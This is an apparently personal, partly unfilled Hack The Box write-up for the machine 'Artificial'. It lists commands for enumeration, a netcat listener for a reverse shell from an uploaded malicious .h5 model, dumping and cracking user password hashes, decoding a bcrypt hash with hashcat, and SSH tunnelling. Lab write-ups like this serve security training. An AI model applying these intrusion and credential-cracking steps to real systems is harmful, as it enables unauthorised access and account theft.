### Hack The Box Writeup: Artificial

## Overview

- **Machine Name**: Artificial
- **Difficulty**: Easy
- **Platform**: Hack The Box
- **Operating System**: Linux
- **Key Objectives**: Gain root/admin access, exploit a specific vulnerability
- **Date Solved**: August 31, 2025

## Tools Used

- **Enumeration**: \[e.g., Nmap, Gobuster\]
- **Exploitation**: \[e.g., Metasploit, Custom Python scripts\]
- **Privilege Escalation**: \[e.g., LinPEAS, Windows Exploit Suggester\]
- **Other**: \[e.g., Burp Suite, Wireshark\]

## Methodology

### Initial Enumeration

```bash
pinc -c 1 10.10.11.74
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.11.74 -oG allPorts
nmap -sCV -p22,80 10.10.11.74 -oN targeted

```

### Exploitation

```bash
# run docker file 
docker build -t my_tf_image .
docker run -it -v $(pwd):/app my_tf_image # all files in the current directory are mounted to /app in the container and in the host

# inside doker container
cd /app
python3 exploit.py # this will create .h5 file

# in local machine, we ca see the same file

nc -nlvp 443

# upload pwn.h5 file  

cd /app/app
find . -name "*.db"
sqlite3 user.db
select * from user;

# ans
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|budi|budi@gmail.com|9c5fa085ce256c7c598f6710584ab25d
7|bar|bar@gmail.com|37b51d194a7513e45b56f6524f2d51f2
8|kontol|kontol@gmail.com|d489a3289ecdc847cb67f7a480e6f9fa
9|tester|test@test.test|f5d1278e8109edd94e1e4197e04873b9
10|user18190|user18190@example.com|5fe71ffb6aa465e11cee013955c28beb
11|test|test@test.com|cc03e747a6afbbcbf8be7668acfebee5
12|test123|thetest@test.com|098f6bcd4621d373cade4e832627b4f6
13|yo|yo@test.com|827ccb0eea8a706c4c34a16891f84e7b

# using hashes.com | we can use john too
c99175974b6e192936d97224638a34f8:mattp005numbertwo

# download file fomr victims mahcine
scp gael@10.10.11.74:/var/backups/backrest_backup.tar.gz .

cat backrest/.config/backrest/config.json

# ans
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}

# using hashes.com
JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP:$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO # like base64 -d

# using hashcat
echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d > /tmp/bycript.hash
hashcat -m 3200 /tmp/bycript.hash /usr/share/wordlists/rockyou.txt --force
hashcat -m 3200 /tmp/bycript.hash --show
 # ans 
 !@#$%^


# ssh tunneling
ssh -L 9898:127.0.0.1:9898 gael@10.10.11.74



```

### Privilege Escalation

\[Explain how you escalated privileges to root/admin. Include any misconfigurations or exploits used.\]

```bash
# Example: Checking for SUID binaries
find / -perm -4000 2>/dev/null
id; whoami; hostnamectl
sudo -l
ss -tulnp | grep LISTEN
ls -la /var/backups


# ans
tcp    LISTEN  0       4096     127.0.0.53%lo:53          0.0.0.0:*             
tcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*             
tcp    LISTEN  0       2048         127.0.0.1:5000        0.0.0.0:*             
tcp    LISTEN  0       4096         127.0.0.1:9898        0.0.0.0:*             
tcp    LISTEN  0       511            0.0.0.0:80          0.0.0.0:*             
tcp    LISTEN  0       128               [::]:22             [::]:*             
tcp    LISTEN  0       511               [::]:80             [::]:* 

# ans
drwxr-xr-x  2 root root       4096 Aug 31 11:44 .
drwxr-xr-x 13 root root       4096 Jun  2 07:38 ..
-rw-r--r--  1 root root      38602 Jun  9 10:48 apt.extended_states.0
-rw-r--r--  1 root root       4253 Jun  9 09:02 apt.extended_states.1.gz
-rw-r--r--  1 root root       4206 Jun  2 07:42 apt.extended_states.2.gz
-rw-r--r--  1 root root       4190 May 27 13:07 apt.extended_states.3.gz
-rw-r--r--  1 root root       4383 Oct 27  2024 apt.extended_states.4.gz
-rw-r--r--  1 root root       4379 Oct 19  2024 apt.extended_states.5.gz
-rw-r--r--  1 root root       4367 Oct 14  2024 apt.extended_states.6.gz
-rw-r-----  1 root sysadm 52357120 Mar  4 22:19 backrest_backup.tar.gz





```

\[Describe the final access achieved, e.g., root shell, admin credentials.\]

## Challenges Faced

\[List specific challenges encountered, e.g., difficulty identifying the correct exploit, dealing with restricted shells.\]

- **Challenge 1**: \[e.g., Nmap scans were blocked by a firewall.\]
  - **Solution**: \[e.g., Used --script-args to bypass restrictions.\]
- **Challenge 2**: \[e.g., Password cracking took too long.\]
  - **Solution**: \[e.g., Optimized wordlist with custom rules in Hashcat.\]

## Lessons Learned

\[Summarize key takeaways from solving the machine.\]

- Learned to identify \[specific vulnerability, e.g., outdated Samba versions\] through thorough enumeration.
- Improved skills in \[technique, e.g., manual exploit development for CVE-XXXX-XXXX\].
- Gained experience with \[tool, e.g., LinPEAS for privilege escalation\].

## References

- \[Link to HTB machine page, e.g., https://app.hackthebox.com/machines/Lame\]
- \[CVE details, e.g., https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-XXXX-XXXX\]
- \[Tool documentation, e.g., https://nmap.org/book/man.html\]
- \[Relevant blog post or tutorial, e.g., https://example.com/samba-exploit-guide\]

---

*Written by YourName, \[Month Year\]. Feedback welcome at \[your contact, e.g., GitHub profile\].*